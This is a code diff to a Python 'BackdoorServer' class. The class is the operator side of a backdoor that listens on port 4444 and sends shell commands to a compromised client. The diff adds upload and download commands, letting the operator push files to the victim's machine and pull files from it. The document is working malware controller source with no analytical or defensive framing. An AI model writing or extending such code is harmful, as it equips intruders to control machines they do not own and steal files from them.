@@ -1,4 +1,5 @@
 import socket
+import os
 
 class BackdoorServer:
     def __init__(self, host='127.0.0.1', port=4444):
@@ -35,6 +36,41 @@ class BackdoorServer:
                 break
         return data
 
+    def send_file(self, client_socket, filepath):
+        try:
+            if not os.path.exists(filepath):
+                return "[!] File not found"
+
+            file_size = os.path.getsize(filepath)
+            client_socket.send(str(file_size).encode())
+            
+            client_socket.recv(self.buffer_size)  # Wait for ready signal
+            
+            with open(filepath, 'rb') as f:
+                data = f.read()
+                client_socket.send(data)
+            return "[+] File sent successfully"
+        except Exception as e:
+            return f"[!] Error sending file: {str(e)}"
+
+    def receive_file(self, client_socket, filepath):
+        try:
+            file_size = int(client_socket.recv(self.buffer_size).decode())
+            client_socket.send("Ready".encode())
+            
+            received_data = b""
+            while len(received_data) < file_size:
+                data = client_socket.recv(self.buffer_size)
+                if not data:
+                    break
+                received_data += data
+
+            with open(filepath, 'wb') as f:
+                f.write(received_data)
+            return "[+] File received successfully"
+        except Exception as e:
+            return f"[!] Error receiving file: {str(e)}"
+
     def handle_client(self, client_socket):
         try:
             while True:
@@ -47,8 +83,16 @@ class BackdoorServer:
                 if command.lower() == 'exit':
                     break
 
-                response = self.receive_all(client_socket)
-                print(response.decode())
+                if command.startswith('upload'):
+                    _, filepath = command.split(' ')
+                    response = self.send_file(client_socket, filepath)
+                elif command.startswith('download'):
+                    _, filepath = command.split(' ')
+                    response = self.receive_file(client_socket, filepath)
+                else:
+                    response = self.receive_all(client_socket).decode()
+                
+                print(response)
 
         except Exception as e:
             print(f"[!] Error: {str(e)}")
